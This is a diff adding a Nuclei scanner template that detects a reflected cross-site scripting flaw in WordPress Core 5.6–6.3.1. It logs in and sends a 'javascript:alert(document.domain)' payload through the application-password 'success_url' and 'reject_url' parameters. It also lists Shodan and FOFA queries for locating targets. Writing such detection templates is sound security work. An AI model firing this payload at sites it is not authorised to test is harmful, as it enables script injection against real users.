@@ -1,0 +1,60 @@
+id: application-pass-xss
+
+info:
+  name: WordPress Core 5.6 and 6.3.1 - Cross-Site Scripting
+  author: nqdung2002
+  severity: medium
+  description: |
+    WordPress Core is vulnerable to Reflected Cross-Site Scripting via the 'success_url' and 'reject_url' parameters when requesting application passwords in versions between 5.6 and 6.3.1 due to insufficient input sanitization and output escaping of pseudo protocol URIs.
+  impact: |
+    This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link and accepting or rejecting the application password.
+  reference:
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-56-631-reflected-cross-site-scripting-via-application-password-requests?asset_slug=wordpress
+    - https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    max-request: 3
+    vendor: wordpress
+    product: wordpress
+    framework: wordpress
+    shodan-query:
+      - cpe:"cpe:2.3:a:wordpress:wordpress"
+      - http.component:"wordpress"
+    fofa-query: body="oembed" && body="wp-"
+  tags: wpscan,wp,wordpress,authenticated,xss
+
+http:
+  - raw:
+      - |
+        GET /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "/wp-content/plugins")'
+        internal: true
+
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      - |
+        GET /wp-admin/authorize-application.php?success_url=javascript%3Aalert%28document.domain%29&reject_url=javascript%3Aalert%28document.domain%29 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "javascript:alert(document.domain)")'
+          - 'contains(content_type_2, "text/html")'
+          - 'status_code_2 == 200'
+        condition: and
+# digest: 490a00463044022072d31f7ba45f7e0f329aef449fc9c37cc546ecdfe60b0fe4e582b7e3467b0d5a022031e3ebc2cd735c5399a22a84c8651d5505292a60edf835194ab9e77e584a1611:922c64590222798bb761d5b6d8e72950
